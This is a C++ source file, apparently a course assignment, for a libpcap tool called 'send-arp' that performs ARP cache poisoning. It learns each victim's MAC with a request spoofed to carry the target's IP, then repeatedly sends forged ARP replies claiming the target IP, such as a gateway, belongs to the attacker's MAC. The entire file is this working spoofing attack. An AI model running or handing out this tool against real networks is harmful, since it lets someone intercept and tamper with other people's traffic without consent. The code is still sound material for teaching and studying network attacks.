#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <cstring>
#include <unistd.h>
#include <vector>
#include <arpa/inet.h>
#include <netinet/in.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

Mac get_mac_address(const char* interface_name) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface_name);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    close(sock);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

std::string ip_to_string(uint32_t ip) {
    struct in_addr addr;
    addr.s_addr = ip;
    return std::string(inet_ntoa(addr));
}

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.254 192.168.10.3 192.168.10.254\n");
}

Mac get_sender_mac(pcap_t* handle, Mac attacker_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");  
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);

    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(target_ip); 
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); 
    packet.arp_.tip_ = htonl(sender_ip); 

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res_recv = pcap_next_ex(handle, &header, &recv_packet);
        if (res_recv == 1) {
            EthHdr* eth_hdr = (EthHdr*)recv_packet;

            if (ntohs(eth_hdr->type_) == EthHdr::Arp) {
                ArpHdr* arp_hdr = (ArpHdr*)(recv_packet + sizeof(EthHdr));
                
                if (ntohl(arp_hdr->sip_) == sender_ip) {
                    return eth_hdr->smac_;
                }
            }
        }
    }
}

void send_arp_reply(pcap_t* handle, Mac attacker_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac; 
    packet.eth_.smac_ = attacker_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = attacker_mac;
    packet.arp_.sip_ = htonl(target_ip); 
    packet.arp_.tmac_ = sender_mac; 
    packet.arp_.tip_ = htonl(sender_ip); 

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) { 
        usage();
        return -1;
    }

    char* interface_name = argv[1];
    Mac attacker_mac = get_mac_address(interface_name);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface_name, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", interface_name, errbuf);
        return -1;
    }

    std::vector<std::pair<Ip, Ip>> ip_pairs;
    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i + 1]);
        ip_pairs.push_back(std::make_pair(sender_ip, target_ip));
    }

    while (true) {
        for (const auto& ip_pair : ip_pairs) {
            Mac sender_mac = get_sender_mac(handle, attacker_mac, ip_pair.first, ip_pair.second);
            send_arp_reply(handle, attacker_mac, sender_mac, ip_pair.first, ip_pair.second);
        }
        sleep(1);
    }

    pcap_close(handle);
}
